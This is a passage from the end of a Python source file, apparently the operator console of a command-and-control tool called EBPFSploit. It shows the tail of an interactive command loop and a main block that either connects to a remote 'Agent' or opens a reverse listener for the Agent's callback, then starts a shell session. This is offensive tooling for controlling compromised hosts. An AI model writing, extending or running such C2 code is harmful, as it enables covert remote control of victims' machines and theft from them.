                    os.system('cls' if os.name == 'nt' else 'clear')

                elif act == "exit":
                    self._save_history()
                    print(f"{Fore.CYAN}[*] Closing session...{Fore.WHITE}")
                    break

                else:
                    print(f"{Fore.RED}[-] Unknown command: {act}. Type 'help' for usage.{Fore.WHITE}")

            except EOFError:
                self._save_history()
                break
            except Exception as e:
                print(f"{Fore.RED}Console Error: {e}{Fore.WHITE}")


if __name__ == "__main__":
    if len(sys.argv) == 3:
        # python console.py <IP> <PORT>  →  Forward connect to Agent
        c2 = EBPFSploit(sys.argv[1], int(sys.argv[2]))
    elif len(sys.argv) == 2:
        # python console.py <PORT>       →  Reverse listener, wait for Agent callback
        c2 = EBPFSploit(None, int(sys.argv[1]))
    else:
        print("Usage:")
        print(f"  python {sys.argv[0]} <IP> <PORT>   Forward: connect to Agent")
        print(f"  python {sys.argv[0]} <PORT>         Reverse: listen for Agent")
        sys.exit(1)
    c2.connect()
    c2.shell()